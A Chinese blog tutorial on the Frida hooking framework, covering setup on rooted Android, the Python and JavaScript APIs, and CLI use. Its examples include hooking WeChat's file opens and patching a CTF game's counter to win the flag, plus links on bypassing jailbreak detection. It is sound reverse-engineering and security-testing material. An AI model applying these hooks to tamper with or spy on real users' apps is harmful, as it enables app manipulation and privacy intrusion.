    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Frida 支持的系统包括：</p>
<ul>
<li>Android(root/非 root),</li>
<li>iOS(越狱/非越狱),</li>
<li>MacOS(关闭 SIP),</li>
<li>Linux, Windows等</li>
</ul>
<p>Frida wiki 的这张表<a href="https://github.com/frida/frida/wiki/Comparison-of-function-hooking-libraries" target="_blank" rel="external">Hook工具兼容性对比</a> 充分说明了frida的强大。</p>
<a id="more"></a>
<p><strong>Frida 开发语言</strong>：JavaScript+python/C/objc</p>
<p><strong>支持的系统版本</strong>：Android(&lt;7.1)</p>
<p><strong>目前主要的问题</strong>：</p>
<ul>
<li>只能 hook so 中导出的函数，像 JNINativeInterface 中 函数指针就无法 hook</li>
<li>不是很稳定</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>可以动态植入 hook 代码</li>
<li>java/native/系统库 均可以 hook</li>
</ul>
<h1 id="安装-amp-配置"><a href="#安装-amp-配置" class="headerlink" title="安装 &amp; 配置"></a>安装 &amp; 配置</h1><p><strong>二进制frida 库</strong>: 从 <a href="https://github.com/frida/frida/releases" target="_blank" rel="external">realeas</a> 下载<br> <strong>python模块</strong>: 从 <a href="https://pypi.python.org/pypi?%3Aaction=search&amp;term=frida&amp;submit=search" target="_blank" rel="external">pypi</a> 下载</p>
<blockquote>
<p>Device<br>$ adb push frida-server /data/local/tmp/<br>$ adb shell<br># su<br># cd /data/local/tmp/<br># chmod 777 frida-server<br># ./frida-server &amp;</p>
<p>PC<br>adb forward tcp:27042 tcp:27042<br>adb forward tcp:27043 tcp:27043</p>
</blockquote>
<h1 id="python-amp-amp-js-开发Api"><a href="#python-amp-amp-js-开发Api" class="headerlink" title="python &amp;&amp; js 开发Api"></a>python &amp;&amp; js 开发Api</h1><p><code>import frida</code><br>导入 python 模块</p>
<h2 id="获取-USB-设备"><a href="#获取-USB-设备" class="headerlink" title="获取 USB 设备"></a>获取 USB 设备</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">    dev = frida.get_usb_device()</div><div class="line"><span class="keyword">except</span>:</div><div class="line">    errlog(<span class="string">'没有设备'</span>)</div></pre></td></tr></table></figure>
<p>返回 frida.core.Device 对象。<br><code>Device(id=&quot;emulator-5554&quot;, name=&quot;Android Emulator 5554&quot;, type=&#39;tether&#39;)</code></p>
<p>还可以获取 -R(Remote设备), -D (根据设备 ID 获取)。。</p>
<h2 id="获取进程信息（Andorid）"><a href="#获取进程信息（Andorid）" class="headerlink" title="获取进程信息（Andorid）"></a>获取进程信息（Andorid）</h2><p>命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">frida-ps -U     查看usb设备进程列表</div><div class="line">frida-ps -R     远程 frida-server 进程列表</div><div class="line">frida-ps -Ua    运行中APP 应用列表（系统 app/用户 app）</div><div class="line">frida-ps -Uai   所有已安装的 App 应用列表（系统 app/用户 app）</div></pre></td></tr></table></figure></p>
<p>API<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">当前最前端Activity所在的进程</div><div class="line"></div><div class="line">front_app = dev.get_frontmost_application()</div><div class="line"></div><div class="line"></div><div class="line">手机所有的进程</div><div class="line"></div><div class="line">processes = dev.enumerate_processes()</div><div class="line"></div><div class="line">枚举手机所有已安装的android APP应用</div><div class="line"></div><div class="line">apps = dev.enumerate_applications()</div><div class="line"><span class="keyword">for</span> app <span class="keyword">in</span> apps:</div><div class="line">    <span class="keyword">print</span> app</div></pre></td></tr></table></figure></p>
<h2 id="枚举某进程的模块及模块中导出的函数"><a href="#枚举某进程的模块及模块中导出的函数" class="headerlink" title="枚举某进程的模块及模块中导出的函数"></a>枚举某进程的模块及模块中导出的函数</h2><ul>
<li>session.enumerate_modules()</li>
<li>module.enumerate_exports()<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">枚举某个进程加载的所有模块以及模块中的导出函数，dex 中没有导出函数</div><div class="line"></div><div class="line">session = dev.attach(<span class="string">"com.tencent.mm"</span>)</div><div class="line">modules = session.enumerate_modules()</div><div class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</div><div class="line">    <span class="keyword">print</span> module</div><div class="line">    export_funcs = module.enumerate_exports()</div><div class="line">    <span class="keyword">print</span> <span class="string">"\tfunc_name\tRVA"</span></div><div class="line">    <span class="keyword">for</span> export_func <span class="keyword">in</span> export_funcs:</div><div class="line">        <span class="keyword">print</span> <span class="string">"\t%s\t%s"</span>%(export_func.name,hex(export_func.relative_address))</div></pre></td></tr></table></figure>
</li>
</ul>
<p><span id="api"></span></p>
<h2 id="JavaScript-API-补充"><a href="#JavaScript-API-补充" class="headerlink" title="JavaScript API [补充]"></a>JavaScript API [补充]</h2><p>这里只介绍我用过的 API，详情请看<a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">官方文档</a></p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>Hook Java 虚拟机，比如 Dalvik 或者 ART</p>
<ul>
<li><code>Java.perform(fn)</code> 只要frida 附加到目标进程的 VM 就会执行 fn 函数 (fn 是 js 函数)<br>  <code>Java.perform(function() {…})</code> <a href="#Java.perform">栗子</a></li>
<li><p><code>Java.enumerateLoadedClasses(callbacks)</code> 枚举已经加载的 Classes <a href="#Java.enumerateLoadedClasses">栗子</a></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Java.enumerateLoadedClasses(&#123;</div><div class="line">&quot;onMatch&quot;: function (className) &#123;...&#125;,</div><div class="line">&quot;onComplete&quot;:function()&#123;... &#125;       // 枚举完成</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p><code>overload(&#39;xxx&#39;)</code>  当要 hook 的函数有多个重载函数时，就需要通过 overload(<code>目标函数参数类型</code>)指定函数的参数列表   <a href="#overload">栗子</a></p>
</li>
<li><code>Java.use(&quot;package.xxx.className&quot;)</code>     动态获取 className 对象 <a href="#Java.use">栗子</a>, 可能使用出现的<a href="#bug1">Bug</a></li>
<li><code>Java.choose(&quot;className&quot;, callbacks)</code>    枚举所有存活的 className 对象，并调用 callbacks 函数   <a href="#Java.choose">栗子</a>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Java.choose(&quot;className&quot;, &#123;</div><div class="line">&quot;onMatch&quot;: function(instance) &#123;...&#125;,</div><div class="line">&quot;onComplete&quot;:function()&#123;... &#125;       // 枚举完成</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Interceptor"><a href="#Interceptor" class="headerlink" title="Interceptor"></a>Interceptor</h3><p>hook so/dylib native 函数</p>
<ul>
<li><code>Interceptor.attach(target, callbacks)</code>  附加到目标函数，当target 执行到时自动调用 callbacks 中的函数  <a href="#Interceptor.attach">栗子</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Interceptor.attach(target, &#123;</div><div class="line">    &quot;onEnter&quot;: function (args) &#123;...&#125;,</div><div class="line">    &quot;onLeave&quot;: function(retval)&#123;...&#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h3><ul>
<li><p><code>Module.enumerateImports(name, callbacks)</code>  目标进程某个模块的导入表,包含导入的类型，函数地址/变量地址，模块名，函数名/变量名  <a href="#module.import">栗子</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Module.enumerateImports(moduleName, &#123;</div><div class="line">    &quot;onMatch&quot;:function(imp) &#123;...&#125;,</div><div class="line">    &quot;onComplete&quot;:function() &#123;...&#125;       // 枚举完成</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>Module.enumerateExports(name, callbacks)</code>  目标进程某个模块的导出表, 包含导出的类型，函数地址/变量地址，模块名，函数名/变量名   <a href="#module.export">栗子</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Module.enumerateExports(moduleName, &#123;</div><div class="line">    &quot;onMatch&quot;:function(imp) &#123;...&#125;,</div><div class="line">    &quot;onComplete&quot;:function() &#123;...&#125;       // 枚举完成</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><ul>
<li><code>rpc.exports</code> 我的理解是这个功能是向 目标进程添加函数，方便 python 客户端直接调用；简单点说就是在目标进程写入自己的后门。<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> codecs</div><div class="line"><span class="keyword">import</span> frida</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</div><div class="line">        print(message[<span class="string">'payload'</span>])</div><div class="line">    <span class="keyword">elif</span> message[<span class="string">'type'</span>] == <span class="string">'error'</span>:</div><div class="line">        print(message[<span class="string">'stack'</span>])</div><div class="line"></div><div class="line">rdev = frida.get_remote_device()</div><div class="line"></div><div class="line">session = rdev.attach(<span class="string">'hello'</span>)  <span class="comment">#/data/local/tmp/hello</span></div><div class="line"><span class="keyword">with</span> codecs.open(<span class="string">'./agent.js'</span>, <span class="string">'r'</span>, <span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</div><div class="line">    source = f.read()</div><div class="line">script = session.create_script(source)</div><div class="line">script.on(<span class="string">'message'</span>, on_message)</div><div class="line">script.load()</div><div class="line">print(script.exports.disassemble(<span class="number">0x4000100</span>))</div><div class="line">print(script.exports.disassemble(<span class="number">0x4000100</span>))</div><div class="line">session.detach()</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos;use strict&apos;;</div><div class="line"></div><div class="line">rpc.exports = &#123;</div><div class="line">  disassemble(address) &#123;</div><div class="line">    return Instruction.parse(ptr(address)).toString();</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我测试的时候 都失败了， 还是去看看 <code>frida-presentations</code> PPT</p>
<h3 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h3><ul>
<li><code>setImmediate(fn)</code>  远程附加到进程时防止超时，可以先执行脚本（等待进程启动）<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">setImmediate(&#123;</div><div class="line">    console.log(&quot;[*] Starting script&quot;);</div><div class="line">    Java.perform(function () &#123;...&#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
</ul>
<p>测试发现 这个方法好像不起作用。。</p>
<h3 id="输出信息"><a href="#输出信息" class="headerlink" title="输出信息"></a>输出信息</h3><ul>
<li><code>send(msg)</code> 发送msg给 python 代码 <code>script.on(&#39;message&#39;, on_message)</code> 注册的 on_message 函数。 <a href="#send">栗子</a></li>
<li><code>console.log(&#39;Done:&#39; + JSON.stringify(this.cnt));</code>  向终端输出信息,并发送给script.on注册的回掉函数  <a href="#console">栗子</a></li>
</ul>
<h1 id="完整的-Demo"><a href="#完整的-Demo" class="headerlink" title="完整的 Demo"></a>完整的 Demo</h1><blockquote>
<p>这里推荐 <a href="http://zhiwei.li/text/?s=frida" target="_blank" rel="external">Zhiwei Li</a> 学习 Frida 的多篇 blog.</p>
</blockquote>
<h2 id="hook-Native"><a href="#hook-Native" class="headerlink" title="hook Native"></a>hook Native</h2><p><span id="Interceptor.attach">Interceptor.attach</span><br><span id="Memory.readCString">Memory.readCString</span><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="comment">#1. 获取Device 对象</span></div><div class="line">rdev = frida.get_remote_device()</div><div class="line"></div><div class="line"><span class="comment">#2. 附加到设备中指定的进程</span></div><div class="line">session = rdev.attach(<span class="string">"com.tencent.mm"</span>)</div><div class="line"></div><div class="line"><span class="comment"># 设置要 hook 的模块和 导出的函数（上一步介绍了获取方法）,然后注册 2个 hook 函数:onEnter,onLeave</span></div><div class="line">scr = <span class="string">"""</span></div><div class="line">Interceptor.attach(Module.findExportByName("libc.so" , "open"), &#123;</div><div class="line">    onEnter: function(args) &#123;</div><div class="line">        send("open("+Memory.readCString(args[0])+","+args[1]+")");</div><div class="line">    &#125;,</div><div class="line">    onLeave:function(retval)&#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">"""</div><div class="line"><span class="comment">#3. 创建hook 脚本</span></div><div class="line">script = session.create_script(scr)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message ,data)</span>:</span></div><div class="line">    <span class="keyword">print</span> message</div><div class="line"></div><div class="line"><span class="comment">#4. 设置回掉函数</span></div><div class="line">script.on(<span class="string">"message"</span> , on_message)</div><div class="line"></div><div class="line"><span class="comment">#5. 加载 hook 脚本</span></div><div class="line">script.load()</div><div class="line"></div><div class="line"><span class="comment">#6. 终端用户交互</span></div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure></p>
<h2 id="hook-Java"><a href="#hook-Java" class="headerlink" title="hook Java"></a>hook Java</h2><p>hook java 同 hook native的代码(1-6步)完全一样，只是 javascript 部分不同，下面只列出 js 部分代码。<br><span id="Java.use">Java.use</span><br><span id="send">send</span><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">//设置要 hook 的 class, 重新实现 hook method,保证程序正常执行 并调用hook 前的 method.</div><div class="line"></div><div class="line">jscode = """</div><div class="line">Java.perform(function () &#123;</div><div class="line">    // Function to hook is defined here</div><div class="line">    var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity');</div><div class="line"></div><div class="line">    // Whenever button is clicked</div><div class="line">    MainActivity.onClick.implementation = function (v) &#123;</div><div class="line">        // Show a message to know that the function got called</div><div class="line">        send('onClick');</div><div class="line"></div><div class="line">        // Call the original onClick handler</div><div class="line">        this.onClick(v);</div><div class="line"></div><div class="line">        // Set our values after running the original onClick handler</div><div class="line">        this.m.value = 0;</div><div class="line">        this.n.value = 1;</div><div class="line">        this.cnt.value = 999;</div><div class="line"></div><div class="line">        // Log to the console that it's done, and we should have the flag!</div><div class="line">        console.log('Done:' + JSON.stringify(this.cnt));</div><div class="line">    &#125;;</div><div class="line">&#125;);</div><div class="line">"""</div></pre></td></tr></table></figure></p>
<p>其实完全可以只使用 js 代码来完成整个 hook工作。下一节介绍 通过 frida-cli 命令就可以在 pc 终端上就可以完成hook 流程。</p>
<h1 id="iOS-上使用Frida"><a href="#iOS-上使用Frida" class="headerlink" title="iOS 上使用Frida"></a>iOS 上使用Frida</h1><p>在iOS上使用 Frida-cli 工具必须要在越狱的手机上安装fridaServer，如果没有越狱的化就只能使用FridaGadget 来hook 指定的APP 操作不是很方便。推荐在越狱的机器上使用。</p>
<p>从cydia 安装的frida是V10.0.6，但是Mac 上之前使用的是 frida 9.2.7。所以要对 Mac 上的frida 进行升级，升级过程出现了一个[pip 的bug][2017/05/22/Bug-pip-安装module的bug/]</p>
<p>参考文章：<a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.4.wEonk6&amp;articleid=870" target="_blank" rel="external">在iOS应用程序中使用Frida绕过越狱检测</a> 介绍了如下的功能：</p>
<ul>
<li>在iOS上设置frida</li>
<li>frida hook DVIA 反越狱检测的案例</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>目前在iOS 上基于frida 流行的2个工具:needle 和 AppMon</p>
<p><strong>Needle</strong>是一个开源的模块化框架，主要简化iOS应用程序安全评估过程，并作为一个中心点。鉴于其模块化方法，Needle很容易扩展新模块，可以以Python脚本的形式加入。<br>地址：<a href="https://github.com/mwrlabs/needle" target="_blank" rel="external">https://github.com/mwrlabs/needle</a></p>
<p><strong>AppMon</strong>是监测和修改本地macOS、iOS、Android系统API的自动化框架，并能通过web接口显示和操作<br>地址：<a href="https://github.com/dpnishant/appmon" target="_blank" rel="external">https://github.com/dpnishant/appmon</a></p>
<h1 id="使用Frida-cli-Hook-推荐"><a href="#使用Frida-cli-Hook-推荐" class="headerlink" title="使用Frida-cli Hook [推荐]"></a>使用Frida-cli Hook [推荐]</h1><p>上面是通过编写 python &amp;&amp; js 混合脚本进行 hook, 下面介绍 frida 命令(js 函数)通过 CLI hook。 这种方法更 cool， 而且使用的命令就是上面的<a href="#api">Api</a>。</p>
<p>这里分2种情况:</p>
<ol>
<li>先启动一个应用，然后再让 Frida 进行附加</li>
<li>使用 <code>-f &lt;包名&gt;</code> 参数，让 Frida 自动生成进程，这种方法hook 的时机较早，可以用来 hook JNI_OnLoad 函数。</li>
</ol>
<p><img src="/include/img/hook/frida-help.png" alt="help"></p>
<h2 id="Frida附加进程"><a href="#Frida附加进程" class="headerlink" title="Frida附加进程"></a>Frida附加进程</h2><ol>
<li><p>在设备上开启进程</p>
</li>
<li><p>执行命令load 脚本（提前编写好 js 脚本）<br><code>frida -U -l xxx.js com.tencent.mm</code><br>-l 注入脚本</p>
</li>
</ol>
<p>如果进程不存在会显示BUG: <code>Failed to attach: unable to find process with name ‘com.tencent.mm’</code></p>
<p><img src="/include/img/hook/frida-load.png" alt="frida -U -l onCreate.js com.tencent.mm"></p>
<h3 id="hook-android-view-View-class"><a href="#hook-android-view-View-class" class="headerlink" title="hook android.view.View class"></a>hook android.view.View class</h3><p><span id="Java.perform">Java.perform</span><br><span id="Java.choose">Java.choose</span><br><span id="console">console</span><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] Starting script"</span>);</div><div class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        Java.choose(<span class="string">"android.view.View"</span>, &#123;</div><div class="line">             <span class="string">"onMatch"</span>:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</div><div class="line">                  <span class="built_in">console</span>.log(<span class="string">"[*] Instance found: "</span> + instance.toString());</div><div class="line">             &#125;,</div><div class="line">             <span class="string">"onComplete"</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                  <span class="built_in">console</span>.log(<span class="string">"[*] Finished heap search"</span>)</div><div class="line">             &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p><img src="/include/img/hook/taobao.png" alt="hook View Class"></p>
<h2 id="Frida启动应用"><a href="#Frida启动应用" class="headerlink" title="Frida启动应用"></a>Frida启动应用</h2><p>以微信为例。<br><img src="/include/img/hook/cli-2.png" alt="frida -U --no-pause -f com.tencent.mm"><br>目标应用已经启动， 还可以添加 <code>-l</code> 参数在应用启动之前注入 hook 的代码。</p>
<p>测试<a href="https://www.frida.re/docs/javascript-api/#java" target="_blank" rel="external">文档</a>中的几个命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[USB::LGE AOSP on HammerHead::com.tencent.mm]-&gt; Java</div><div class="line">&#123;</div><div class="line">    &quot;androidVersion&quot;: &quot;6.0.1&quot;,</div><div class="line">    &quot;available&quot;: true</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Hook-android-app-Activity-的-onCreate-android-os-Bundle"><a href="#Hook-android-app-Activity-的-onCreate-android-os-Bundle" class="headerlink" title="Hook android.app.Activity 的 onCreate(android.os.Bundle)"></a>Hook android.app.Activity 的 onCreate(android.os.Bundle)</h3><ul>
<li>overload(params)  当要 hook 的函数有多个重载函数时，使用 overload 指定函数参数<br><span id="overload">overload</span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> Activity = Java.use(<span class="string">"android.app.Activity"</span>);</div><div class="line">    Activity.onCreate.overload(<span class="string">'android.os.Bundle'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"onCreate() got called! Let's call the original implementation"</span>);</div><div class="line">        <span class="keyword">this</span>.onCreate(<span class="built_in">arguments</span>[<span class="number">0</span>]);</div><div class="line">    &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ul>
<p>重写  android.app.Activity::onCreate(android.os.Bundle)函数,  overload 指定具体的 onCreate 版本。</p>
<p><img src="/include/img/hook/oncreate.png" alt="frida cli hook onCreate"></p>
<h3 id="Java-app-Classes"><a href="#Java-app-Classes" class="headerlink" title="Java app Classes"></a>Java app Classes</h3><p>（警告：此处会输出很多内容，后面我会解释代码的意思。）:<br><span id="Java.enumerateLoadedClasses">Java.enumerateLoadedClasses</span><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    Java.enumerateLoadedClasses(&#123;</div><div class="line">        <span class="string">"onMatch"</span>:<span class="function"><span class="keyword">function</span>(<span class="params">className</span>)</span>&#123;</div><div class="line">             <span class="built_in">console</span>.log(className) &#125;,</div><div class="line">        <span class="string">"onComplete"</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; &#125;</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div></pre></td></tr></table></figure></p>
<h3 id="Native-Modules-info"><a href="#Native-Modules-info" class="headerlink" title="Native Modules info"></a>Native Modules info</h3><p><span id="module.import"></span><br>通过 js 构造原型对象类型发送给 on_message(), 方便on_message 同时处理有多个 hook 消息的情况。</p>
<ol>
<li>查看 libbinder.so模块的导入表<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Module.enumerateImports(&apos;libbinder.so&apos;, &#123;</div><div class="line">    &quot;onMatch&quot;:function(imp) &#123;</div><div class="line"></div><div class="line">        var result = imp.type+&quot; : &quot;+ String(imp.address) +&quot;  &quot;+ imp.module +&quot;  :  &quot;+ imp.name</div><div class="line">        var foo = &#123;</div><div class="line">            fun: &apos;import&apos;,</div><div class="line">            data: result</div><div class="line">        &#125;</div><div class="line">        send(foo)</div><div class="line">    &#125;,</div><div class="line">    &quot;onComplete&quot;:function() &#123;</div><div class="line">        var foo = &#123;</div><div class="line">            fun: &apos;import&apos;,</div><div class="line">            data: &apos;#!over&apos;</div><div class="line">        &#125;</div><div class="line">        send(foo)</div><div class="line">    &#125;</div><div class="line">    &#125;);</div></pre></td></tr></table></figure>
</li>
</ol>
<p><span id="module.export"></span></p>
<ol>
<li>查看 libbinder.so 模块的导出表<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Module.enumerateExports(&apos;libbinder.so&apos;, &#123;</div><div class="line">    &quot;onMatch&quot;:function(exp) &#123;</div><div class="line"></div><div class="line">        var result = exp.type+&quot; : &quot;+ String(exp.address) +&quot;  &quot;+&quot;  :  &quot;+ exp.name</div><div class="line">        var foo = &#123;</div><div class="line">            fun: &apos;export&apos;,</div><div class="line">            data: result</div><div class="line">        &#125;</div><div class="line">        send(foo)</div><div class="line">    &#125;,</div><div class="line">    &quot;onComplete&quot;:function() &#123;</div><div class="line">        var foo = &#123;</div><div class="line">            fun: &apos;export&apos;,</div><div class="line">            data: &apos;#!over&apos;</div><div class="line">        &#125;</div><div class="line">        send(foo)</div><div class="line">    &#125;</div><div class="line">    &#125;);</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p><a href="http://bobao.360.cn/learning/detail/3634.html" target="_blank" rel="external">【技术分享】利用FRIDA攻击Android应用程序（二）</a><br>java 层破解题。</p>
<p><a href="https://www.frida.re/docs/examples/android/" target="_blank" rel="external">Example tool built for an Android CTF</a><br><a href="https://koz.io/using-frida-on-android-without-root/" target="_blank" rel="external">非 Root 条件下，如何在 Android 上使用 Frida 框架</a><br>frida-gadget.so<br><a href="http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html" target="_blank" rel="external">instrumenting-android-applications-with-frida</a><br><a href="https://github.com/frida/frida-presentations/tree/master/NLUUG2015" target="_blank" rel="external">frida-presentations</a><br><a href="https://rotlogix.com/2016/03/20/objective-c-instrumentation-with-frida/" target="_blank" rel="external">基于 Frida 框架的 Objective-C 插桩方法</a></p>
